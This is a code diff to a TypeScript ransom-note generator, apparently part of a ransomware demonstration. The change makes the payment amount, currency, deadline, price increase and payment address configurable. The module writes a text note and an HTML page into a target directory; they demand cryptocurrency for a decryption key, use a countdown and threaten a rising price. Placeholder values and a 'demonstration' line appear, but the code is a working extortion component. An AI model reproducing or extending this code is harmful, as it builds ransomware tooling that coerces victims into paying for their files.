@@ -1,14 +1,35 @@
 import fs from 'fs'
 import path from 'path'
 
+interface RansomParams {
+    amount: number;
+    currency: string;
+    deadlineHours: number;
+    priceIncrease: number;
+    paymentAddress?: string;
+}
+
 export function createRansomNote(
     victimId: string,
     targetDirectory: string,
     numberOfFiles: number,
-    paymentAmount: string = '500 USD in Bitcoin',
-    paymentAddress: string = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', // Example BTC address (Bitcoin genesis block)
-    deadline: number = 72 // Hours
+    params?: RansomParams
 ): void {
+    // Default params if not provided
+    const defaultParams: RansomParams = {
+        amount: 0.05,
+        currency: 'BTC',
+        deadlineHours: 72,
+        priceIncrease: 50,
+        paymentAddress: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' // Example BTC address (Bitcoin genesis block)
+    };
+
+    // Merge provided params with defaults
+    const ransomParams = { ...defaultParams, ...params };
+    
+    // Format payment amount
+    const paymentAmount = `${ransomParams.amount} ${ransomParams.currency}`;
+    
     const notePath = path.join(targetDirectory, 'RANSOM_NOTE.txt')
 
     const noteContent = `
@@ -27,8 +48,8 @@ Your personal ID is: ${victimId}
 Yes, but you need the decryption key which only we have.
 
 ► How to recover your files
-1. Send ${paymentAmount} to the following Bitcoin address:
-   ${paymentAddress}
+1. Send ${paymentAmount} to the following ${ransomParams.currency} address:
+   ${ransomParams.paymentAddress}
 
 2. Send an email to fake_ransom@example.com with your personal ID
    and the transaction ID of your payment.
@@ -36,7 +57,7 @@ Yes, but you need the decryption key which only we have.
 3. You will receive the decryption tool and key within 24 hours.
 
 ► Important Warning
-You have ${deadline} hours to pay. After that, the price will double.
+You have ${ransomParams.deadlineHours} hours to pay. After that, the price will increase by ${ransomParams.priceIncrease}%.
 DO NOT attempt to decrypt your files with third-party software or the files may be 
 permanently damaged.
 
@@ -119,15 +140,15 @@ To recover your files in this demonstration, contact your system administrator.
         <div class="payment">
             <p><strong>► How to recover your files</strong></p>
             <ol style="text-align: left;">
-                <li>Send ${paymentAmount} to the following Bitcoin address:<br>
-                <code>${paymentAddress}</code></li>
+                <li>Send ${paymentAmount} to the following ${ransomParams.currency} address:<br>
+                <code>${ransomParams.paymentAddress}</code></li>
                 <li>Send an email to fake_ransom@example.com with your personal ID and the transaction ID of your payment.</li>
                 <li>You will receive the decryption tool and key within 24 hours.</li>
             </ol>
         </div>
         
         <div class="timer">
-            Time remaining: <span id="countdown">${deadline}:00:00</span>
+            Time remaining: <span id="countdown">${ransomParams.deadlineHours}:00:00</span>
         </div>
         
         <div class="footer">
@@ -141,7 +162,7 @@ To recover your files in this demonstration, contact your system administrator.
     <script>
         // Simple countdown timer
         function startCountdown() {
-            let hours = ${deadline};
+            let hours = ${ransomParams.deadlineHours};
             let minutes = 0;
             let seconds = 0;
             
